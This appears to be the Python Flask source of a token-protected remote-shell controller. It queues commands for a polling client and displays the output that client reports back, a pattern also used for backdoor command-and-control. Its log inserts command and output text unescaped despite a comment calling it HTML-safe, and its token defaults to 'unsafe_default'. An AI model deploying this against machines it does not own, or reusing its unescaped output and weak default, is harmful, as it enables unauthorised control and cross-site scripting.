import os
from flask import Flask, request, jsonify

app = Flask(__name__)

# SECURITY: Get token from Render Environment Variables
SECRET_TOKEN = os.environ.get("SECRET_TOKEN", "unsafe_default")

# In-memory storage
cmd_queue = []
results = []

@app.route('/')
def index():
    return "<h3>Command Center Online</h3><a href='/admin'>Go to Admin</a>"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    global results
    status_msg = ""

    # 1. Handle Command Submission
    if request.method == 'POST':
        user_token = request.form.get('token')
        cmd = request.form.get('cmd')

        if user_token != SECRET_TOKEN:
            status_msg = "<div style='color:red; background:#300; padding:10px;'>❌ INVALID TOKEN</div>"
        elif cmd:
            cmd_queue.append(cmd)
            status_msg = f"<div style='color:#0f0; background:#030; padding:10px;'>✅ Command '<b>{cmd}</b>' queued!</div>"

    # 2. Render the Dashboard (No auto-refresh)
    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Shell</title>
        <style>
            body {{ font-family: monospace; background: #1a1a1a; color: #ddd; padding: 20px; max-width: 800px; margin: auto; }}
            input {{ padding: 10px; background: #333; border: 1px solid #555; color: #fff; border-radius: 4px; }}
            input[type="text"] {{ width: 60%; }}
            button {{ padding: 10px 20px; background: #007acc; color: white; border: none; cursor: pointer; border-radius: 4px; }}
            button:hover {{ background: #005f9e; }}
            .log {{ background: #000; padding: 15px; border-radius: 5px; border: 1px solid #333; white-space: pre-wrap; }}
            .entry {{ border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }}
            .cmd-line {{ color: #0f0; font-weight: bold; }}
            hr {{ border-color: #333; }}
        </style>
    </head>
    <body>
        <h2>💻 Remote Shell Control</h2>

        {status_msg}

        <br>
        <form method='POST'>
            <input type='password' name='token' placeholder='Secret Token' required>
            <input type='text' name='cmd' placeholder='Enter command (e.g. ls -la)' autofocus required>
            <button type='submit'>Run</button>
        </form>

        <hr>
        <h3>📋 Output Log (Manual Refresh)</h3>
        <div class="log">
            {"".join(reversed(results[-10:]))}
        </div>
        <p style="text-align:center; color:#666;">
            <a href="javascript:location.reload()" style="color:#888; text-decoration:none;">Click to Refresh Log</a>
        </p>
    </body>
    </html>
    """

    return html_template

@app.route('/poll', methods=['GET'])
def poll():
    auth = request.headers.get('Authorization')
    if auth != SECRET_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403

    if cmd_queue:
        return jsonify({"command": cmd_queue.pop(0)})
    return jsonify({"command": None})

@app.route('/report', methods=['POST'])
def report():
    auth = request.headers.get('Authorization')
    if auth != SECRET_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403

    data = request.json
    if data:
        # HTML-safe formatting for the log
        entry = f"<div class='entry'><div class='cmd-line'>$ {data.get('cmd')}</div>{data.get('output')}</div>"
        results.append(entry)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
